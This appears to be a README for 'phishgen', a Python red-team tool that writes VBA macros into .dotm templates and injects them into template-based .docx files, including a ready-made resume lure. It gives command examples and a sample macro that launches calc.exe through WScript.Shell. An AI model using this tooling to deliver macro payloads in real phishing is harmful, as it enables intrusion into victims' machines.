# Phishing generator
`phishgen` is a python tool designed to create macro files, modify and inject them in existing `.docx` files.  


## Table of Contents

- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
    - [Inject Mode](#inject-mode)
    - [Macro Mode](#macro-mode)
    - [Create Mode](#create-mode)
- [Examples](#examples)
- [Project Structure](#project-structure)
- [Contributing](#contributing)
- [License](#license)

## Features

- **Inject macros**: Inject macros from a `.dotm` file to a `.docx` document (needs to be created from `.dotx` template).
- **Modify macros**: Replace source code of the `.dotm` file using a provided string or external file.
- **Create documents**: Generate Word documents with predefined configurations (`fulldoc`, `empty`, `full`, `macro`).
- **Cross-platform support**: Everything, except modifying macros is cross-platform. For modifying macro-files you need `Windows` and preinstalled `Word` application.
  
## Installation

1. **Clone the Repository**

   ```bash
   git clone https://github.com/yourusername/word-macro-manager.git
   cd word-macro-manager
    ```

# Usage
`phishgen` provides three modes:
## Inject mode
In this mode, `phishgen` will inject .dotm macro in .docx file. 
**Important**! .docx file must be created by template (.dotx file). <br>
Example:
```bash
phishgen inject generated_document.docx macro.dotm -o patched_document.docx
```

## Macro mode
**Important!** This mode is available only on `Windows` systems with `Word` application. <br>
Idea is generating .dotm file with provided source code. Source code can be file (`-f` option) or string (`-s` option). <br>
**Example**: <br>
payload.txt:
```
Dim wsh As Object
Set wsh = CreateObject("WScript.Shell")
wsh.Run "calc.exe"
Set wsh = Nothing
```

```bash
phishgen macro -f payload.txt -o macro.dotm
```
Also source code as string:
```bash
phishgen macro -s "payload" -o macro.dotm
```

## Create mode
Just copies some templates from inner folder to provided filepath. <br>
Modes:
- **fulldoc**: copies `.docx` resume, created by template, ready to injection
- **empty**: copies empty `.dotx` pattern. Needed to create `.docx` document with your content.
- **full**: copies `.dotx` pattern of resume from step 1. You can edit this resume as you wish!
```bash
phishgen create fulldoc -d test_folder/
phishgen create empty -d test_folder/
phishgen create full -d test_folder/
```